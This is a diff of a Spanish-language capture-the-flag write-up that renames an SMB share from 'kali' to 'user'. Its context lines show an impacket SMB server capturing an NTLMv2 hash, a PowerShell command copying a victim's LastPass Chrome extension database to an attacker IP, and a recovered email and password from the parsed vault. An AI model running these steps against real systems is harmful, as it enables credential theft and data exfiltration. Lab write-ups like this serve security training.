@@ -243,7 +243,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p class="plain-text">Y aunque obtenemos un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> la contraseña parece bastante fuerte por lo que no logramos crackearla a traves de fuerza bruta y obtenerla en texto plano</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -1122,7 +1122,7 @@ PS C:\Users\rrodriguez\Downloads></span>
 
 <p class="plain-text">Para descargarlo podemos copiarlo a un servidor <code class="language-plaintext highlighter-rouge">smb</code> creado en nuestro equipo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\rrodriguez\Downloads> </span><span class="am">cp </span><span class="az">'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\1' </span><span class="p">\\10.10.14.10\kali\1  
+<code><span class="p">PS C:\Users\rrodriguez\Downloads> </span><span class="am">cp </span><span class="az">'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\1' </span><span class="p">\\10.10.14.10\user\1  
 PS C:\Users\rrodriguez\Downloads></span>
 </code></pre></div></div><br>
 
@@ -1134,7 +1134,7 @@ Output directory: .
 Email: ruby@roundsoft.com
 Password: L1f3_1s_pl@st1c
 
-Data exported to /home/kali/lastpass-vault-parser
+Data exported to /home/user/lastpass-vault-parser
 
 press ENTER to exit
 
